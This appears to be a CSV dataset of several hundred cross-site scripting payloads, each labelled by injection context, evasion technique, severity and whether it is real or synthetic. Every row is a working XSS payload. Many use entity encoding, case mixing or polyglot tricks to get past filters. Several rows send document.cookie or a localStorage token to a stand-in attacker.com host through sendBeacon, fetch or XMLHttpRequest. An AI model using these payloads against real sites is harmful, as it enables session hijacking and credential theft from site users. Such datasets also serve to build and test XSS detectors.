payload,context,technique,severity,length,source
"' ontouchst&#97;rt=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,low,75,synthetic
%3Clink/oninput=alert(document.domain)%3E,tag_injection,synthetic,medium,41,synthetic
`><img src=x on&#97;nim&#97;tionc&#97;nc&#101;l=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,79,synthetic
`><Img srC=x onPlaYinG=aLerT(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,44,synthetic
"__proto__[""ontouchmov&#101;""]=&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink,synthetic,low,102,synthetic
<sp&#97;n src=x oncopy=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,53,synthetic
' oncopy=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,low,50,synthetic
"\"" oncopy=confirm(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,medium,42,synthetic
&quot; onplay=confirm(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,41,synthetic
' ><svg onp&#97;g&#101;hid&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,74,synthetic
"<samp draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</samp>",tag_injection,none,medium,61,real
<xss x=y ontoggl&#101;=consol&#101;.log('XSS')>,tag_injection,synthetic,low,47,synthetic
%3Carea onclose=prompt(1)%3E,tag_injection,synthetic,medium,28,synthetic
"java
scr	ipt:prompt(String.fromCharCode(88,83,83))",js_uri,synthetic,high,50,synthetic
"__pRotO__[""oNinPut""]=EvaL(dOcuMenT.cOokIe+'&lOc='+lOcaTioN.hRef)",dom_sink,synthetic,high,64,synthetic
%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E,script_injection,synthetic,medium,33,synthetic
	onsubmit=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,47,synthetic
"document.body.innerHTML=""%3Cimg src=x onerror=alert('XSS')%3E""",dom_sink,synthetic,high,62,synthetic
<bdi contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,57,real
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=pRomPt(1)>""",dom_sink,synthetic,high,55,synthetic
`%3E%3Cimg src=x onsecuritypolicyviolation=prompt(1)%3E,attribute_escape,synthetic,medium,55,synthetic
""" ><svg onpagehide=console.log(document.domain)>",attribute_escape,synthetic,medium,48,synthetic
"javascript:alert()//'/*`/*""/**/;alert()//%0D%0A-->'>""></title></textarea></style></noscript></noembed></template></select>&lt;svg/oNloAd=alert()&gt;<FRAME onload=alert()></script>\"";alert()//<svg/oNloAd=alert()>",js_uri,comment_injection|url_encoding|case_variation,medium,211,real
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onwebkitanimationend=""alert(1)""></ruby>",tag_injection,none,medium,99,real
" ondrop=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,55,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=f&#101;tch(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))>"")",dom_sink,synthetic,low,164,synthetic
"LocAtiOn=""jaVasCriPt:EvaL('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)""",dom_sink,synthetic,high,64,synthetic
"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>",tag_injection,none,medium,122,real
<x onxxx=1 onxxx=1,tag_injection,none,low,18,real
%27><img src=x onmouseover=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,50,synthetic
"<video
onmozfullscreenchange=prompt(%27XSS%27)>",tag_injection,synthetic,medium,47,synthetic
"<img
onreset=console.log(document.domain)>",tag_injection,synthetic,medium,42,synthetic
%22><img src=x ongestureend=console.log(location.hash)>,attribute_escape,synthetic,medium,55,synthetic
' ><svG oNinPut=coNfiRm(1)>,attribute_escape,synthetic,medium,27,synthetic
"<frame ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,91,real
<auDio x=Y oNinPut=prOmpT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
"<marquee onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",tag_injection,none,medium,67,real
onerror=console.log('XSS'),event_handler,synthetic,medium,26,synthetic
AnonKryptiQuz_HERE_%EF%BC%9Cimg%20src%3Dxxx%20onerror%3Dalert(1)%EF%BC%9E,generic,url_encoding,medium,73,real
"`><img src=x onplaying=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
"onlo&#97;d=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,76,synthetic
"""><image/src/onerror=prompt(""AnonKryptiQuz"")>",tag_injection,none,medium,45,real
<seLecT	oNvoLumEchAngE=cOnsOle.loG(1)>,tag_injection,synthetic,medium,38,synthetic
"<p oncut=""alert(1)"" contenteditable>AnonKryptiQuz</p>",tag_injection,none,medium,53,real
' %3E%3Csvg onmouseover=confirm('XSS')%3E,attribute_escape,synthetic,medium,41,synthetic
' ontr&#97;nsitionrun=consol&#101;.log('XSS') ',attribute_escape,synthetic,low,47,synthetic
%3Cscript%3EFunction('prompt('XSS')')();%3C/script%3E,script_injection,synthetic,medium,53,synthetic
`><Img srC=x onSeaRch=prOmpT(lOcaTioN.hAsh)>,attribute_escape,synthetic,medium,44,synthetic
<tr ons&#101;l&#101;ct=consol&#101;.log(1)>,tag_injection,synthetic,low,43,synthetic
&quOt; onGesTurEstArt=alErt(loCatIon.haSh) x=&quOt;,attribute_escape,synthetic,medium,51,synthetic
"%27><img src=x onreset=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
"""><BliNk OnpOpsTatE=cOnsOle.loG(dOcuMenT.dOmaIn)>",tag_injection,synthetic,medium,49,synthetic
"&#101;v&#97;l(""&#97;l&#101;rt(loc&#97;tion.h&#97;sh)"")",dom_sink,synthetic,low,54,synthetic
<arEa Src=x OncLosE=pRomPt(1)>,tag_injection,synthetic,medium,30,synthetic
ondr&#97;gst&#97;rt=confirm/**/(1),event_handler,synthetic,low,34,synthetic
""" ontouchmove=confirm(document.domain) """,attribute_escape,synthetic,medium,40,synthetic
&quot; onwheel=console.log(document.domain) x=&quot;,attribute_escape,synthetic,medium,52,synthetic
onmous&#101;wh&#101;&#101;l=j&#97;v&#97;script:consol&#101;.log('XSS'),event_handler,synthetic,low,70,synthetic
' ><svg onfocus=prompt(location.hash)>,attribute_escape,synthetic,medium,38,synthetic
"<q onmouseout=""alert(1)"">AnonKryptiQuz</q>",tag_injection,none,medium,42,real
&quOt; onGotPoiNteRcaPtuRe=AleRt(DocUmeNt.DomAin) x=&qUot;,attribute_escape,synthetic,medium,58,synthetic
\' onp&#97;g&#101;show=consol&#101;.log(loc&#97;tion.h&#97;sh)//,attribute_escape,synthetic,low,64,synthetic
\%27 oncopy=console.log(location.hash)//,attribute_escape,synthetic,medium,40,synthetic
&quOt; onPoiNteRovEr=ConSolE.lOg('XSS') x=&quOt;,attribute_escape,synthetic,medium,48,synthetic
"%22><marquee onbeforetoggle=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,65,synthetic
"""%3E%3Cimg src=x onchange=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,67,synthetic
"<diAloG
oNenDed=coNsoLe.Log(1)>",tag_injection,synthetic,medium,31,synthetic
<xsS oNenD=pRomPt('XSS') onEnd=prOmpT('XSS')>,tag_injection,synthetic,medium,45,synthetic
alert(1)>//INJECTX,generic,none,medium,18,real
\' onanimationcancel=prompt(location.hash)//,attribute_escape,synthetic,medium,44,synthetic
"<listing id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></listing>",tag_injection,none,medium,90,real
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",script_injection,encoding|case_variation,high,229,real
<SCRIPT>cOnfIrm(1)</SCRIPT>,script_injection,synthetic,medium,27,synthetic
%3Cbase oninput=alert('XSS')%3E,tag_injection,synthetic,medium,31,synthetic
' oncont&#101;xtm&#101;nu=&#97;l&#101;rt(1) ',attribute_escape,synthetic,low,45,synthetic
"<map onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</map>",tag_injection,none,medium,67,real
\' onfocusin=console.log(location.hash)//,attribute_escape,synthetic,medium,41,synthetic
&quOt; onMouSeoVer=prOmpT(1) x=&qUot;,attribute_escape,synthetic,medium,37,synthetic
%3CSCRIPT%3Econsole.log(1)%3C/SCRIPT%3E,script_injection,synthetic,medium,39,synthetic
' ><svg onpointermove=\u0061lert(document.domain)>,attribute_escape,synthetic,low,50,synthetic
' ontransitionend=\u0061lert(document.domain) ',attribute_escape,synthetic,low,47,synthetic
"xxxxxxxxx'});}); </script><script>prompt (""PLEASE%20\nSUBSCRIBE"") </script>",script_injection,url_encoding,low,75,real
""" ><svg oninput=confirm(1)>",attribute_escape,synthetic,medium,27,synthetic
<header onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
"\"" onbeforematch=confirm(1)//",attribute_escape,synthetic,medium,29,synthetic
"<nobr oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</nobr>",tag_injection,none,medium,71,real
"<tt draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",tag_injection,none,medium,80,real
"element.setAttribute(%22onclick%22,%22XMLHttpRequest(String.fromCharCode(88,83,83))%22)",dom_sink,synthetic,high,87,synthetic
"document.body.innerHTML=""%3Cimg src=x onerror=confirm(localStorage.getItem('token'))%3E""",dom_sink,synthetic,high,88,synthetic
javascript:void(\u0061lert(location.hash)),js_uri,synthetic,low,42,synthetic
"<style>:target {color:red;}</style><li id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></li>",tag_injection,none,medium,108,real
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=f&#101;tch(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))>""",dom_sink,synthetic,low,130,synthetic
&quot; onbeforematch=confirm(location.hash) x=&quot;,attribute_escape,synthetic,medium,52,synthetic
"<font onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</font>",tag_injection,none,medium,70,real
__${prOmpT(dOcuMenT.dOmaIn)}__::.X,template_injection,synthetic,medium,34,synthetic
"&quOt; onCloSe=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) x=&qUot;",attribute_escape,synthetic,high,61,synthetic
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>",dom_sink,none,low,64,real
"Payload: `search=%1b(J&lang=en"";alert(1)//",generic,url_encoding,medium,42,real
eval(%22confirm(%27XSS%27)%22),dom_sink,synthetic,medium,30,synthetic
<form id=test onforminput=javascript:alert(8938)><input></form><button form=test onformchange=javascript:alert(8938)>X,js_uri,none,medium,118,real
`><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=confirm('XSS')>,attribute_escape,synthetic,medium,66,synthetic
j&#97;v&#97;script:%0&#97;prompt(loc&#97;tion.h&#97;sh),js_uri,synthetic,medium,55,synthetic
"<dt onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></dt>",tag_injection,none,medium,277,real
"<t&#101;mpl&#97;t&#101; x=y onb&#101;gin=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,96,synthetic
' %3E%3Csvg onkeypress=alert('XSS')%3E,attribute_escape,synthetic,medium,38,synthetic
"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",js_uri,none,medium,72,real
"<picture><source srcset=""validimage.png""><image onload=alert(1)></picture>",tag_injection,none,medium,74,real
<&#97; x=y onb&#101;for&#101;m&#97;tch=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,72,synthetic
"%22 onselect=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,54,synthetic
<taBle x=Y oNtoUchEnd=prOmpT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,46,synthetic
%22 ><svg onwaiting=prompt(document.domain)>,attribute_escape,synthetic,medium,44,synthetic
' onended=prompt(document.domain) ',attribute_escape,synthetic,medium,35,synthetic
"<element draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</element>",tag_injection,none,medium,72,real
<input3 onpointermove=alert(1) style=display:block>AnonKryptiQuz</input3>,tag_injection,none,medium,73,real
&quOt; onBefOreCut=coNsoLe.Log(1) x=&quOt;,attribute_escape,synthetic,medium,42,synthetic
"<element draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</element>",tag_injection,none,medium,92,real
%22 ><svg ontoggle=console.log(1)>,attribute_escape,synthetic,medium,34,synthetic
"'%3E%3Cimg src=x onpointermove=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,70,synthetic
`><img src=x onpromptdismiss=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,59,synthetic
"__proto__[""onwebkitfullscreenchange""]=prompt(document.cookie+'&loc='+location.href)",dom_sink,synthetic,high,83,synthetic
"<picture oncut=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",tag_injection,none,medium,65,real
"""><img src=x ondblclick=consol&#101;.log('XSS')>",attribute_escape,synthetic,low,48,synthetic
<noscript onpoint&#101;rdown=prompt(docum&#101;nt.dom&#97;in) onpoint&#101;rdown=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,114,synthetic
{{$On.ConStrUctOr('coNfiRm('XSS')')()}},template_injection,synthetic,medium,39,synthetic
 onmousedown=confirm(%27XSS%27),event_handler,synthetic,medium,31,synthetic
"<style>@keyframes x{}</style><style style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></style>",tag_injection,none,medium,103,real
"""><img src=x onkeydown=\u0061lert('XSS')>",attribute_escape,synthetic,low,41,synthetic
<base	onpointerup=\u0061lert(location.hash)>,tag_injection,synthetic,low,44,synthetic
&quOt; onTouChmOve=prOmpT(1) x=&qUot;,attribute_escape,synthetic,medium,37,synthetic
"<bdo onmouseup=""alert(1)"">AnonKryptiQuz</bdo>",tag_injection,none,medium,45,real
"<IMG SRC=x ondblclick=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,61,real
<title onstalled=alert(%27XSS%27)/>,tag_injection,synthetic,medium,35,synthetic
	on&#97;nim&#97;tionit&#101;r&#97;tion=confirm('XSS'),event_handler,synthetic,medium,53,synthetic
""" ><svg onended=\u0061lert('XSS')>",attribute_escape,synthetic,low,34,synthetic
<canvas onpointerenter=alert(1) style=display:block>AnonKryptiQuz</canvas>,tag_injection,none,medium,74,real
${aLerT('XSS')|N},template_injection,synthetic,medium,17,synthetic
"LocAtiOn=""jaVasCriPt:AleRt('//AttAckEr.Com/?c='+DocUmeNt.CooKie)""",dom_sink,synthetic,high,65,synthetic
\' onb&#101;for&#101;cut=consol&#101;.log(1)//,attribute_escape,synthetic,low,46,synthetic
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,generic,html_entity,low,131,real
"<link draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</link>",tag_injection,none,medium,66,real
\' OnbLur=prOmpT('XSS')//,attribute_escape,synthetic,medium,25,synthetic
""" %3E%3Csvg onbeforematch=alert('XSS')%3E",attribute_escape,synthetic,medium,41,synthetic
"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable style=display:block>drop here</listing>",tag_injection,none,medium,131,real
""" ><svg ontr&#97;nsitionst&#97;rt=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,82,synthetic
"""><img src=x on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(1)>",attribute_escape,synthetic,low,71,synthetic
<script>/*/alert(document.domain)</script>,script_injection,synthetic,medium,42,synthetic
"__proto__[""onp&#97;g&#101;sw&#97;p""]=prompt('XSS')",dom_sink,synthetic,medium,50,synthetic
%27 onbeforeinput=console.log(document.domain) %27,attribute_escape,synthetic,medium,50,synthetic
\' onfocus=console.log(location.hash)//,attribute_escape,synthetic,medium,39,synthetic
<form id=x tabindex=1 onbeforeactivate=alert(1)></form>,tag_injection,none,medium,55,real
%22><img src=x onwebkittransitionend=confirm(location.hash)>,attribute_escape,synthetic,medium,60,synthetic
'><img src=x ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,65,synthetic
"onpromptdismiss=j&#97;v&#97;script:consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,91,synthetic
"j&#97;v&#97;
script:consol&#101;.log('XSS')",js_uri,synthetic,low,43,synthetic
"""><Img srC=x onBegIn=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"__proto__[%22onpaste%22]=confirm(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,63,synthetic
&quot; onmousewheel=alert(location.hash) x=&quot;,attribute_escape,synthetic,medium,49,synthetic
<listing onpointerleave=alert(1) style=display:block>AnonKryptiQuz</listing>,tag_injection,none,medium,76,real
"<script>setTimeout(%27confirm(%27XSS%27)%27,0)</script>",script_injection,synthetic,medium,55,synthetic
"OnrEpeAt=AleRt(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,45,synthetic
<viDeo onDraGstArt=alErt('XSS') oNdrAgsTarT=aLerT('XSS')>,tag_injection,synthetic,medium,57,synthetic
"<style>@keyframes slidein {}</style><nobr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nobr>",tag_injection,none,medium,162,real
"<img \x39src=x onerror=""javascript:alert(1)"">",js_uri,none,medium,45,real
"%22><body ongesturestart=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,68,synthetic
"<map onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</map>",tag_injection,none,medium,62,real
JavAscRipT:cOnsOle.loG/***/(doCumEnt.doMaiN),js_uri,synthetic,low,44,synthetic
javascript:%0aprompt(document.domain),js_uri,synthetic,medium,37,synthetic
"<a href=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"">click me</a>",js_uri,html_entity|comment_injection|url_encoding,medium,198,real
"""><img src=x onpromptdismiss=console.log('XSS')>",attribute_escape,synthetic,medium,48,synthetic
<object onpointerup=alert(1) style=display:block>AnonKryptiQuz</object>,tag_injection,none,medium,71,real
on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,64,synthetic
\%27 ontouchend=console.log(%27XSS%27)//,attribute_escape,synthetic,medium,40,synthetic
j&#97;vascr	ipt:prompt(document.domain),js_uri,synthetic,medium,39,synthetic
<tr x=Y oNpoIntErrAwuPdaTe=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,48,synthetic
%22%27%3E'><script>alert(2);</script>,script_injection,url_encoding,medium,37,real
"<STYLE>li {list-style-image: url(""javascript:alert('AnonKryptiQuz')"");}</STYLE><UL><LI>AnonKryptiQuz</br>",js_uri,case_variation,medium,105,real
"\' OnpLayIng=coNfiRm(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
<a/href=&#74;ava%0a%0d%09script&colon;alert()>click,generic,html_entity|url_encoding,medium,51,real
"JavAscRipT:/*-/*`/*\`/*'/*""/**/(/* */oNCliCk=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) )//%0D%0A%0d%0a",js_uri,synthetic,high,98,synthetic
"window[%22eval%22](navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink,synthetic,high,78,synthetic
"<style>:target {transform: rotate(180deg);}</style><img2 id=x style=""transition:transform 2s"" ontransitionrun=print()></img2>",tag_injection,none,low,125,real
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23,dom_sink,url_encoding,medium,267,real
&quOt; onPagEshOw=ConSolE.lOg('XSS') x=&quOt;,attribute_escape,synthetic,medium,45,synthetic
onscrollend=javascr	ipt:console.log(location.hash),event_handler,synthetic,medium,50,synthetic
"__proto__[%22ondragover%22]=eval(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,63,synthetic
%3Canimatetransform	oncontextmenu=prompt(document.domain)%3E,tag_injection,synthetic,medium,60,synthetic
"<multicol onmousemove=""alert(1)"">AnonKryptiQuz</multicol>",tag_injection,none,medium,57,real
<plaintext onpointerenter=alert(1) style=display:block>AnonKryptiQuz</plaintext>,tag_injection,none,medium,80,real
{{ ProMpt(1) }},template_injection,synthetic,medium,15,synthetic
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></rt>",tag_injection,none,medium,97,real
' %3E%3Csvg onsecuritypolicyviolation=prompt(1)%3E,attribute_escape,synthetic,medium,50,synthetic
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)>"")",dom_sink,synthetic,high,196,synthetic
"<progress draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,92,real
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""prompt(loc&#97;tion.h&#97;sh)"")",dom_sink,synthetic,medium,88,synthetic
OnmOusEdoWn=ConFirM&#40;1&#41;,event_handler,synthetic,low,30,synthetic
"<ifr&#97;m&#101;
oninput=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,low,65,synthetic
"<style>:target {transform: rotate(180deg);}</style><nextid id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nextid>",tag_injection,none,medium,130,real
"<figure onclick=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,69,real
"<area draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</area>",tag_injection,none,medium,81,real
'><img src=x onpoint&#101;rdown=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,73,synthetic
<canvas id=x tabindex=1 onactivate=alert(1)></canvas>,tag_injection,none,medium,53,real
%22 ><svg ontouchmove=confirm(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
<wbr onpointermove=alert(1) style=display:block>AnonKryptiQuz</wbr>,tag_injection,none,medium,67,real
<set onpointermove=confirm(location.hash)/>,tag_injection,synthetic,medium,43,synthetic
"JavAscRipT:cOnfIrm/*x*/(StrIng.frOmCHarCodE(88,83,83))",js_uri,synthetic,high,54,synthetic
<dir id=x tabindex=1 onfocus=alert(1)></dir>,tag_injection,none,medium,44,real
"<br onmouseenter=""alert(1)"">AnonKryptiQuz</br>",tag_injection,none,medium,46,real
"${{'alert('XSS')'.replace('alert('XSS')','')}}",template_injection,synthetic,medium,46,synthetic
<svg@load=this.alert(1)>,generic,none,medium,24,real
"location.href=""javascr	ipt:confirm(1)""",dom_sink,synthetic,high,38,synthetic
javascript:alert/**/(1),js_uri,synthetic,low,23,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:&#101;v&#97;l(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))""",dom_sink,synthetic,low,116,synthetic
' ontransitionrun=console.log('XSS') ',attribute_escape,synthetic,medium,38,synthetic
');confirm(1);//,attribute_escape,none,medium,16,real
<svg><mark onload=alert(1)></mark>,tag_injection,none,medium,34,real
"setTimeout(%22console.log(localStorage.getItem(%27token%27))%22,0)",dom_sink,synthetic,high,66,synthetic
'%3E%3Cimg src=x onfullscreenchange=console.log(1)%3E,attribute_escape,synthetic,medium,53,synthetic
onpointermove=alert&#40;%27XSS%27&#41;,event_handler,synthetic,low,38,synthetic
 onPlaYinG=pRomPt(DocUmeNt.DomAin),event_handler,synthetic,medium,34,synthetic
<nav id=x tabindex=1 onfocusin=alert(1)></nav>,tag_injection,none,medium,46,real
"<style>:target {color: red;}</style><center id=x style=""transition:color 10s"" ontransitioncancel=print()></center>",tag_injection,none,low,114,real
"' ondblclick=alert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,51,synthetic
#{&#97;l&#101;rt('XSS')},template_injection,synthetic,low,24,synthetic
"`><img src=x ontransitionrun=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
'><Img srC=x onEndEd=ProMpt(doCumEnt.doMaiN)>,attribute_escape,synthetic,medium,45,synthetic
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=confirm(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))>""",dom_sink,synthetic,medium,127,synthetic
<maRquEe OnaUxcLicK=cOnfIrm(loCatIon.haSh)/>,tag_injection,synthetic,medium,44,synthetic
"<viDeo onPasTe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,52,synthetic
"<source oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=alert('XSS')>"")",dom_sink,synthetic,medium,74,synthetic
"<scRipT>//prOmpT(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection,synthetic,high,56,synthetic
"%3Ctr	ontransitionend=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,62,synthetic
"__proto__[%22onreset%22]=XMLHttpRequest(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,70,synthetic
"OnbEfoRetOggLe=ConFirM&#40;StrIng.frOmCHarCodE(88,83,83)&#41;",event_handler,synthetic,high,61,synthetic
"<wbr onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",tag_injection,none,medium,67,real
&quot; onkeypress=\u0061lert(1) x=&quot;,attribute_escape,synthetic,low,40,synthetic
"<video onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,69,real
<svg onpromptdismiss=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,59,synthetic
"""`'><script>\x7Ejavascript:alert(1)</script>",script_injection,none,medium,44,real
'><Img srC=x onCopY=cOnfIrm(loCatIon.haSh)>,attribute_escape,synthetic,medium,43,synthetic
ongestureend=javascript:console.log('XSS'),event_handler,synthetic,medium,42,synthetic
